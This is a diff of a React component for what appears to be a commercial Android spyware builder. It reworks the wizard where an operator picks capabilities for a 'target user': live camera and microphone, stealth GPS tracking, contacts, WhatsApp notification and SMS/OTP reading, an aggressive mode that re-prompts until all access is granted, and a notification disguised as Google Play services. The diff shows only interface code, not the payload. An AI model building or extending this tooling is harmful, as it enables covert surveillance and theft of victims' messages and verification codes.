-                            {/* Stylish Highlighted Title Indicator ("ADD YOUR PERMISSIONS IN APP") */}
-                            <div className="flex items-center gap-2.5 px-1">
-                                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
-                                <span className="text-xs font-extrabold bg-gradient-to-r from-emerald-300 via-teal-200 to-cyan-300 bg-clip-text text-transparent uppercase tracking-wider">
-                                    ADD YOUR PERMISSIONS IN APP
+                        <div className="space-y-4 animate-in fade-in zoom-in-95 duration-200">
+                            
+                            <div className="flex items-center gap-2 px-1">
+                                <span className="w-2 h-2 rounded-full bg-orange-400 animate-pulse" />
+                                <span className="text-xs font-mono font-black text-orange-300 uppercase tracking-wider">
+                                    Configure App Capabilities
                                 </span>
                             </div>
 
-                            {/* Core Permissions Grid (Includes Notification Reader prominent card!) */}
-                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
+                            {/* Core Permissions Grid */}
+                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                 
-                                {/* Gallery & Storage - Soft Emerald */}
-                                <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(16,185,129,0.1)]">
-                                    <div className="flex flex-col">
-                                        <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-emerald-200">Gallery & Storage</span>
-                                            <button type="button" onClick={() => setShowPermissionInfo('storage')} className="text-emerald-400/70 hover:text-emerald-300">
-                                                <Info size={14} />
+                                {/* Gallery & Storage */}
+                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                    <div className="flex flex-col min-w-0">
+                                        <div className="flex items-center gap-1.5">
+                                            <HardDrive size={14} className="text-orange-400" />
+                                            <span className="text-xs font-bold text-white">Gallery & Storage</span>
+                                            <button type="button" onClick={() => setShowPermissionInfo('storage')} className="text-white/40 hover:text-white cursor-pointer">
+                                                <Info size={12} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-emerald-300/70">Grants access to browse, index & download device photos & media files.</span>
+                                        <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Index & download device photos & media files.</span>
                                     </div>
                                     <button
                                         type="button"
                                         onClick={() => setEnableStoragePermission(!enableStoragePermission)}
-                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${enableStoragePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
+                                        className={`w-10 h-5.5 rounded-full transition-colors relative shrink-0 cursor-pointer ${enableStoragePermission ? 'bg-orange-500 shadow-[0_0_10px_#f97316]' : 'bg-white/20'}`}
                                     >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-6' : 'left-1'}`} />
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-0.75 transition-transform ${enableStoragePermission ? 'left-5' : 'left-1'}`} />
                                     </button>
                                 </div>
 
-                                {/* Camera Capture - Soft Cyan */}
-                                <div className={`p-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(6,182,212,0.1)]`}>
-                                    <div className="flex flex-col">
-                                        <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-cyan-200">Camera Capture</span>
-                                            {!isPremium && (
-                                                <Lock size={13} className="text-white/25" />
-                                            )}
-                                            <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-cyan-400/70 hover:text-cyan-300">
-                                                <Info size={14} />
+                                {/* Camera Capture */}
+                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                    <div className="flex flex-col min-w-0">
+                                        <div className="flex items-center gap-1.5">
+                                            <Camera size={14} className="text-cyan-400" />
+                                            <span className="text-xs font-bold text-white">Camera Capture</span>
+                                            {!isPremium && <Lock size={12} className="text-white/30" />}
+                                            <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-white/40 hover:text-white cursor-pointer">
+                                                <Info size={12} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-cyan-300/70">Grants live video streaming and instant photo snapshots from front & rear cameras.</span>
+                                        <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Live video stream & photo snapshots.</span>
                                     </div>
                                     <button
                                         type="button"
@@ -926,25 +901,24 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             if (!isPremium) { onUpgrade?.('Camera Capture', 'premium'); return; }
                                             setEnableCameraPermission(!enableCameraPermission);
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
+                                        className={`w-10 h-5.5 rounded-full transition-colors relative shrink-0 cursor-pointer ${!isPremium ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500 shadow-[0_0_10px_#06b6d4]' : 'bg-white/20'}`}
                                     >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && isPremium ? 'left-6' : 'left-1'}`} />
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-0.75 transition-transform ${enableCameraPermission && isPremium ? 'left-5' : 'left-1'}`} />
                                     </button>
                                 </div>
 
-                                {/* Live Microphone - Soft Violet */}
-                                <div className={`p-4 rounded-2xl bg-purple-500/10 border border-purple-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(168,85,247,0.1)]`}>
-                                    <div className="flex flex-col">
-                                        <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-purple-200">Live Microphone</span>
-                                            {!isPremium && (
-                                                <Lock size={13} className="text-white/25" />
-                                            )}
-                                            <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-purple-400/70 hover:text-purple-300">
-                                                <Info size={14} />
+                                {/* Live Microphone */}
+                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                    <div className="flex flex-col min-w-0">
+                                        <div className="flex items-center gap-1.5">
+                                            <Mic size={14} className="text-purple-400" />
+                                            <span className="text-xs font-bold text-white">Live Microphone</span>
+                                            {!isPremium && <Lock size={12} className="text-white/30" />}
+                                            <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-white/40 hover:text-white cursor-pointer">
+                                                <Info size={12} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-purple-300/70">Grants real-time room surround audio streaming and voice recording.</span>
+                                        <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Room surround audio & voice notes.</span>
                                     </div>
                                     <button
                                         type="button"
@@ -952,25 +926,24 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             if (!isPremium) { onUpgrade?.('Live Microphone', 'premium'); return; }
                                             setEnableMicrophonePermission(!enableMicrophonePermission);
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
+                                        className={`w-10 h-5.5 rounded-full transition-colors relative shrink-0 cursor-pointer ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500 shadow-[0_0_10px_#a855f7]' : 'bg-white/20'}`}
                                     >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && isPremium ? 'left-6' : 'left-1'}`} />
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-0.75 transition-transform ${enableMicrophonePermission && isPremium ? 'left-5' : 'left-1'}`} />
                                     </button>
                                 </div>
 
-                                {/* Live Location - Warm Orange */}
-                                <div className={`p-4 rounded-2xl bg-orange-500/10 border border-orange-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(249,115,22,0.1)]`}>
-                                    <div className="flex flex-col">
-                                        <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-orange-200">Live Location</span>
-                                            {!isPremium && (
-                                                <Lock size={13} className="text-white/25" />
-                                            )}
-                                            <button type="button" onClick={() => setShowPermissionInfo('location')} className="text-orange-400/70 hover:text-orange-300">
-                                                <Info size={14} />
+                                {/* Live Location */}
+                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                    <div className="flex flex-col min-w-0">
+                                        <div className="flex items-center gap-1.5">
+                                            <MapPin size={14} className="text-amber-400" />
+                                            <span className="text-xs font-bold text-white">Live Location</span>
+                                            {!isPremium && <Lock size={12} className="text-white/30" />}
+                                            <button type="button" onClick={() => setShowPermissionInfo('location')} className="text-white/40 hover:text-white cursor-pointer">
+                                                <Info size={12} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-orange-300/70">Grants stealth GPS background tracking and pinpointing.</span>
+                                        <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Stealth GPS telemetry & fix history.</span>
                                     </div>
                                     <button
                                         type="button"
@@ -978,26 +951,24 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             if (!isPremium) { onUpgrade?.('Live Location', 'premium'); return; }
                                             setEnableLocationPermission(!enableLocationPermission);
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableLocationPermission ? 'bg-orange-500' : 'bg-white/20'}`}
+                                        className={`w-10 h-5.5 rounded-full transition-colors relative shrink-0 cursor-pointer ${!isPremium ? 'bg-white/10' : enableLocationPermission ? 'bg-amber-500 shadow-[0_0_10px_#f59e0b]' : 'bg-white/20'}`}
                                     >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableLocationPermission && isPremium ? 'left-6' : 'left-1'}`} />
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-0.75 transition-transform ${enableLocationPermission && isPremium ? 'left-5' : 'left-1'}`} />
                                     </button>
                                 </div>
 
-
-                                {/* Contacts Sync - Soft Green */}
-                                <div className={`p-4 rounded-2xl bg-green-500/10 border border-green-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(34,197,94,0.1)]`}>
-                                    <div className="flex flex-col">
-                                        <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-green-200">Contacts Sync</span>
-                                            {isBasicPlan && (
-                                                <Lock size={13} className="text-white/25" />
-                                            )}
-                                            <button type="button" onClick={() => setShowPermissionInfo('contacts')} className="text-green-400/70 hover:text-green-300">
-                                                <Info size={14} />
+                                {/* Contacts Sync */}
+                                <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                    <div className="flex flex-col min-w-0">
+                                        <div className="flex items-center gap-1.5">
+                                            <Users size={14} className="text-emerald-400" />
+                                            <span className="text-xs font-bold text-white">Contacts Sync</span>
+                                            {isBasicPlan && <Lock size={12} className="text-white/30" />}
+                                            <button type="button" onClick={() => setShowPermissionInfo('contacts')} className="text-white/40 hover:text-white cursor-pointer">
+                                                <Info size={12} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-green-300/70">Grants access to sync device phonebook contacts & stored email accounts.</span>
+                                        <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Sync phonebook directory & vCard.</span>
                                     </div>
                                     <button
                                         type="button"
@@ -1005,43 +976,41 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             if (isBasicPlan) { onUpgrade?.('Contacts Sync', 'standard'); return; }
                                             setEnableContactsPermission(!enableContactsPermission);
                                         }}
-                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
+                                        className={`w-10 h-5.5 rounded-full transition-colors relative shrink-0 cursor-pointer ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-emerald-500 shadow-[0_0_10px_#10b981]' : 'bg-white/20'}`}
                                     >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-0.75 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-5' : 'left-1'}`} />
                                     </button>
                                 </div>
                             </div>
 
-                            {/* Collapsible Advanced Permissions Button (SMS & Aggressive Mode) */}
+                            {/* Collapsible Advanced Stealth Drawer */}
                             <div className="pt-2">
                                 <button
                                     type="button"
                                     onClick={() => setShowAdvancedPermissions(!showAdvancedPermissions)}
-                                    className="w-full py-3 px-4 rounded-2xl bg-white/[0.04] hover:bg-white/[0.08] border border-white/15 flex items-center justify-between text-xs font-extrabold text-emerald-300 transition-all shadow-sm"
+                                    className="clay-capsule w-full py-2.5 px-4 rounded-xl flex items-center justify-between text-xs font-mono font-bold text-orange-300 hover:text-white transition-all cursor-pointer"
                                 >
                                     <div className="flex items-center gap-2">
-                                        <Sliders size={15} />
-                                        <span>Advanced Stealth & Persistence Options</span>
+                                        <Sliders size={14} />
+                                        <span>Advanced Stealth & Interception</span>
                                     </div>
-                                    {showAdvancedPermissions ? <ChevronUp size={16} /> : <ChevronDown size={16} />}
+                                    {showAdvancedPermissions ? <ChevronUp size={15} /> : <ChevronDown size={15} />}
                                 </button>
 
-                                {/* Collapsible Advanced Section */}
                                 {showAdvancedPermissions && (
-                                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5 mt-3 animate-in fade-in duration-200">
-                                        {/* Notification Reader (Monitored Alerts) - Soft Sky */}
-                                        <div className="p-4 rounded-2xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(14,165,233,0.1)]">
-                                            <div className="flex flex-col">
-                                                <div className="flex items-center gap-2">
-                                                    <span className="text-sm font-bold text-sky-200">Notification Reader</span>
-                                                    {isBasicPlan && (
-                                                        <Lock size={13} className="text-white/25" />
-                                                    )}
-                                                    <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-sky-400/70 hover:text-sky-300">
-                                                        <Info size={14} />
+                                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mt-3 animate-in fade-in duration-200">
+                                        {/* Notification Reader */}
+                                        <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                            <div className="flex flex-col min-w-0">
+                                                <div className="flex items-center gap-1.5">
+                                                    <Bell size={14} className="text-sky-400" />
+                                                    <span className="text-xs font-bold text-white">Alerts Listener</span>
+                                                    {isBasicPlan && <Lock size={12} className="text-white/30" />}
+                                                    <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-white/40 hover:text-white cursor-pointer">
+                                                        <Info size={12} />
                                                     </button>
                                                 </div>
-                                                <span className="text-xs text-sky-300/70">Monitors WhatsApp, Instagram & incoming messaging notifications.</span>
+                                                <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">WhatsApp & social push notifications.</span>
                                             </div>
                                             <button
                                                 type="button"
@@ -1049,52 +1018,47 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                     if (isBasicPlan) { onUpgrade?.('Notification Reader', 'standard'); return; }
                                                     setEnableNotificationListener(!enableNotificationListener);
                                                 }}
-                                                className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
+                                                className={`w-10 h-5.5 rounded-full transition-colors relative shrink-0 cursor-pointer ${isBasicPlan ? 'bg-white/10' : enableNotificationListener ? 'bg-sky-500 shadow-[0_0_10px_#0ea5e9]' : 'bg-white/20'}`}
                                             >
-                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener && isStandard ? 'left-6' : 'left-1'}`} />
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-0.75 transition-transform ${enableNotificationListener && isStandard ? 'left-5' : 'left-1'}`} />
                                             </button>
                                         </div>
 
-                                        {/* SMS Access - Soft Rose */}
-                                        <div className={`p-4 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(244,63,94,0.1)]`}>
-                                            <div className="flex flex-col">
-                                                <div className="flex items-center gap-2">
-                                                    <span className="text-sm font-bold text-rose-200">SMS Messages</span>
-                                                    {isBasicPlan && (
-                                                        <Lock size={13} className="text-rose-400/50" />
-                                                    )}
-                                                    <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-rose-400/70 hover:text-rose-300">
-                                                        <Info size={14} />
+                                        {/* SMS Access */}
+                                        <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3">
+                                            <div className="flex flex-col min-w-0">
+                                                <div className="flex items-center gap-1.5">
+                                                    <MessageSquare size={14} className="text-rose-400" />
+                                                    <span className="text-xs font-bold text-white">SMS Messages</span>
+                                                    {isBasicPlan && <Lock size={12} className="text-white/30" />}
+                                                    <button type="button" onClick={() => setShowPermissionInfo('sms')} className="text-white/40 hover:text-white cursor-pointer">
+                                                        <Info size={12} />
                                                     </button>
                                                 </div>
-                                                <span className="text-xs text-rose-300/70">Grants access to read incoming SMS messages & OTP verification codes.</span>
+                                                <span className="text-[10px] text-white/40 font-mono mt-0.5 truncate">Read incoming SMS conversations & OTP.</span>
                                             </div>
                                             <button
                                                 type="button"
                                                 onClick={() => {
                                                     if (isBasicPlan) { onUpgrade?.('SMS Messages', 'standard'); return; }
-                                                    if (!enableSmsPermission) {
-                                                        setShowPlayProtectWarning(true);
-                                                    } else {
-                                                        setEnableSmsPermission(false);
-                                                    }
+                                                    if (!enableSmsPermission) setShowPlayProtectWarning(true);
+                                                    else setEnableSmsPermission(false);
                                                 }}
-                                                className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-rose-500' : 'bg-white/20'}`}
+                                                className={`w-10 h-5.5 rounded-full transition-colors relative shrink-0 cursor-pointer ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-rose-500 shadow-[0_0_10px_#f43f5e]' : 'bg-white/20'}`}
                                             >
-                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-0.75 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-5' : 'left-1'}`} />
                                             </button>
                                         </div>
 
-                                        {/* Aggressive Persistence Mode - Soft Amber */}
-                                        <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(245,158,11,0.1)]">
-                                            <div className="flex flex-col">
-                                                <div className="flex items-center gap-2">
-                                                    <span className="text-sm font-bold text-amber-200">Aggressive Mode</span>
-                                                    {isBasicPlan && (
-                                                        <Lock size={13} className="text-amber-400/50" />
-                                                    )}
+                                        {/* Aggressive Mode */}
+                                        <div className="clay-capsule p-3.5 rounded-2xl flex items-center justify-between gap-3 sm:col-span-2">
+                                            <div className="flex flex-col min-w-0">
+                                                <div className="flex items-center gap-1.5">
+                                                    <Zap size={14} className="text-amber-400" />
+                                                    <span className="text-xs font-bold text-white">Aggressive Persistence Mode</span>
+                                                    {isBasicPlan && <Lock size={12} className="text-white/30" />}
                                                 </div>
-                                                <span className="text-xs text-amber-300/70">Repeatedly prompts the target user for permissions until all required access is granted.</span>
+                                                <span className="text-[10px] text-white/40 font-mono mt-0.5">Repeatedly prompts target user until all access permissions are granted.</span>
                                             </div>
                                             <button
                                                 type="button"
@@ -1102,9 +1066,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                     if (isBasicPlan) { onUpgrade?.('Aggressive Mode', 'standard'); return; }
                                                     setAggressivePermissions(!aggressivePermissions);
                                                 }}
-                                                className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-amber-500' : 'bg-white/20'}`}
+                                                className={`w-10 h-5.5 rounded-full transition-colors relative shrink-0 cursor-pointer ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-amber-500 shadow-[0_0_10px_#f59e0b]' : 'bg-white/20'}`}
                                             >
-                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-6' : 'left-1'}`} />
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-0.75 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-5' : 'left-1'}`} />
                                             </button>
                                         </div>
                                     </div>
@@ -1113,24 +1077,26 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </div>
                     )}
 
-                    {/* STEP 3: BACKGROUND SERVICE NOTIFICATION STYLE & ACTION */}
+                    {/* ═════════ STEP 3: BACKGROUND SERVICE STYLE & STEALTH ═════════ */}
                     {activeStep === 'notifications' && (
-                        <div className="space-y-6">
+                        <div className="space-y-5 animate-in fade-in zoom-in-95 duration-200">
                             
-                            {/* Header Indicator */}
-                            <div className="flex items-center gap-2.5 px-1">
-                                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
-                                <span className="text-xs font-extrabold bg-gradient-to-r from-emerald-300 via-teal-200 to-cyan-300 bg-clip-text text-transparent uppercase tracking-wider">
-                                    SELECT BACKGROUND SERVICE STYLE
+                            <div className="flex items-center gap-2 px-1">
+                                <span className="w-2 h-2 rounded-full bg-orange-400 animate-pulse" />
+                                <span className="text-xs font-mono font-black text-orange-300 uppercase tracking-wider">
+                                    Persistent Service Camouflage
                                 </span>
                             </div>
 
-                            {/* Custom UI Dropdown Selector for Notification Style */}
-                            <div className="space-y-4">
+                            {/* Dropdown Selectors */}
+                            <div className="space-y-3.5">
+                                
+                                {/* Style Dropdown */}
                                 <div className="relative">
-                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2">Notification Display Style</label>
+                                    <label className="block text-xs font-mono font-bold text-white/50 uppercase tracking-wider mb-1.5">
+                                        Notification Disguise Preset
+                                    </label>
                                     
-                                    {/* Custom UI Card Dropdown Button */}
                                     <button
                                         type="button"
                                         onClick={() => {
@@ -1138,55 +1104,51 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             setIsActionMenuOpen(false);
                                             setIsIconMenuOpen(false);
                                         }}
-                                        className="w-full bg-black/60 border border-emerald-500/40 hover:border-emerald-500/70 rounded-2xl p-4 flex items-center justify-between text-left transition-all shadow-[0_0_15px_rgba(16,185,129,0.15)]"
+                                        className="clay-capsule w-full p-3.5 rounded-2xl flex items-center justify-between text-left transition-all cursor-pointer"
                                     >
                                         <div className="flex items-center gap-3">
-                                            <span className="text-2xl">{NOTIFICATION_PRESETS[notificationStyle]?.icon || "ℹ️"}</span>
+                                            <span className="text-xl">{NOTIFICATION_PRESETS[notificationStyle]?.icon || "ℹ️"}</span>
                                             <div>
-                                                <div className="text-sm font-bold text-white">
+                                                <div className="text-xs font-black text-white">
                                                     {NOTIFICATION_PRESETS[notificationStyle]?.title || "Google Play services"}
                                                 </div>
-                                                <div className="text-xs text-fg-3">
-                                                    {NOTIFICATION_PRESETS[notificationStyle]?.text || "Checking for updates…"}
+                                                <div className="text-[10px] text-white/40 font-mono">
+                                                    {NOTIFICATION_PRESETS[notificationStyle]?.text || "Running background checks…"}
                                                 </div>
                                             </div>
                                         </div>
-                                        <ChevronDown size={18} className={`text-emerald-400 transition-transform ${isStyleMenuOpen ? 'rotate-180' : ''}`} />
+                                        <ChevronDown size={16} className={`text-orange-400 transition-transform ${isStyleMenuOpen ? 'rotate-180' : ''}`} />
                                     </button>
 
-                                    {/* Custom UI Dropdown List */}
                                     {isStyleMenuOpen && (
-                                        <div className="mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-56 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
+                                        <div className="absolute top-full left-0 right-0 mt-2 z-50 clay-card p-1 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-56 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
                                             {Object.entries(NOTIFICATION_PRESETS).map(([key, preset]) => (
                                                 <button
                                                     key={key}
                                                     type="button"
                                                     onClick={() => handleSelectStyle(key)}
-                                                    className={`w-full p-3.5 flex items-center justify-between text-left transition-colors ${
-                                                        notificationStyle === key ? 'bg-emerald-500/15 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
+                                                    className={`w-full p-3 flex items-center justify-between text-left transition-colors cursor-pointer rounded-xl ${
+                                                        notificationStyle === key ? 'bg-orange-500/15 text-orange-200 font-bold' : 'hover:bg-white/5 text-white/70'
                                                     }`}
                                                 >
                                                     <div className="flex items-center gap-3">
-                                                        <span className="text-xl">{preset.icon}</span>
+                                                        <span className="text-lg">{preset.icon}</span>
                                                         <div>
-                                                            <div className="text-xs font-extrabold text-white">{preset.title}</div>
-                                                            <div className="text-[11px] text-fg-4">{preset.text}</div>
+                                                            <div className="text-xs font-bold text-white">{preset.title}</div>
+                                                            <div className="text-[10px] text-white/40 font-mono">{preset.text}</div>
                                                         </div>
                                                     </div>
-                                                    {notificationStyle === key && <CheckCircle2 size={16} className="text-emerald-400" />}
+                                                    {notificationStyle === key && <Check size={14} className="text-orange-400" />}
                                                 </button>
                                             ))}
                                         </div>
                                     )}
                                 </div>
 
-                                {/* Clean Simple Custom UI Dropdown Selector for On-Click Action */}
+                                {/* Click Action Dropdown */}
                                 <div className="relative">
-                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2 flex items-center justify-between">
-                                        <span>When User Taps Notification</span>
-                                        <span className="text-[10px] font-semibold text-emerald-400/80">
-                                            Tap Action
-                                        </span>
+                                    <label className="block text-xs font-mono font-bold text-white/50 uppercase tracking-wider mb-1.5">
+                                        On-Click Tap Action
                                     </label>
                                     
                                     <button
@@ -1196,22 +1158,21 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             setIsStyleMenuOpen(false);
                                             setIsIconMenuOpen(false);
                                         }}
-                                        className="w-full bg-black/60 border border-white/15 hover:border-emerald-500/40 rounded-2xl p-3.5 flex items-center justify-between text-left transition-all"
+                                        className="clay-capsule w-full p-3.5 rounded-2xl flex items-center justify-between text-left transition-all cursor-pointer"
                                     >
-                                        <div className="flex items-center gap-3">
-                                            <div className="w-8 h-8 rounded-xl bg-white/5 flex items-center justify-center text-emerald-300">
-                                                <MousePointerClick size={16} />
+                                        <div className="flex items-center gap-2.5">
+                                            <div className="w-7 h-7 rounded-lg bg-orange-500/15 flex items-center justify-center text-orange-400">
+                                                <MousePointerClick size={14} />
                                             </div>
                                             <span className="text-xs font-bold text-white">
                                                 {CLICK_ACTIONS[notificationClickAction] || "Open App Info & Permissions"}
                                             </span>
                                         </div>
-                                        <ChevronDown size={18} className={`text-fg-3 transition-transform ${isActionMenuOpen ? 'rotate-180' : ''}`} />
+                                        <ChevronDown size={16} className={`text-white/40 transition-transform ${isActionMenuOpen ? 'rotate-180' : ''}`} />
                                     </button>
 
-                                    {/* Action Dropdown List - Ordered 2nd Do Nothing, clean simple titles without subtitles */}
                                     {isActionMenuOpen && (
-                                        <div className="mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-56 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
+                                        <div className="absolute top-full left-0 right-0 mt-2 z-50 clay-card p-1 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 max-h-56 overflow-y-auto custom-scrollbar animate-in fade-in duration-150">
                                             {Object.entries(CLICK_ACTIONS).map(([key, label]) => (
                                                 <button
                                                     key={key}
@@ -1220,123 +1181,73 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                         setNotificationClickAction(key);
                                                         setIsActionMenuOpen(false);
                                                     }}
-                                                    className={`w-full p-3.5 flex items-center justify-between text-left transition-colors ${
-                                                        notificationClickAction === key ? 'bg-emerald-500/15 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
+                                                    className={`w-full p-3 flex items-center justify-between text-left transition-colors cursor-pointer rounded-xl ${
+                                                        notificationClickAction === key ? 'bg-orange-500/15 text-orange-200 font-bold' : 'hover:bg-white/5 text-white/70'
                                                     }`}
                                                 >
                                                     <span className="text-xs font-bold text-white">{label}</span>
-                                                    {notificationClickAction === key && <CheckCircle2 size={16} className="text-emerald-400 flex-shrink-0 ml-2" />}
+                                                    {notificationClickAction === key && <Check size={14} className="text-orange-400 shrink-0 ml-2" />}
                                                 </button>
                                             ))}
                                         </div>
                                     )}
                                 </div>
 
-                                {/* Custom UI Dropdown Selector for Notification Status Bar Icon */}
-                                <div className="relative">
-                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2">Notification Status Bar Icon</label>
-                                    
-                                    <button
-                                        type="button"
-                                        onClick={() => {
-                                            setIsIconMenuOpen(!isIconMenuOpen);
-                                            setIsStyleMenuOpen(false);
-                                            setIsActionMenuOpen(false);
-                                        }}
-                                        className="w-full bg-black/60 border border-white/15 hover:border-white/30 rounded-2xl p-3.5 flex items-center justify-between text-left transition-all"
-                                    >
-                                        <div className="flex items-center gap-3">
-                                            <span className="text-xl">{ICON_OPTIONS[notificationIcon]?.symbol || "ℹ️"}</span>
-                                            <div className="text-xs font-bold text-white">
-                                                {ICON_OPTIONS[notificationIcon]?.label || "Info Badge"}
-                                            </div>
-                                        </div>
-                                        <ChevronDown size={18} className={`text-fg-3 transition-transform ${isIconMenuOpen ? 'rotate-180' : ''}`} />
-                                    </button>
-
-                                    {/* Icon Dropdown List */}
-                                    {isIconMenuOpen && (
-                                        <div className="mt-2 bg-[#18191c] border border-white/20 rounded-2xl shadow-2xl overflow-hidden divide-y divide-white/5 animate-in fade-in duration-150">
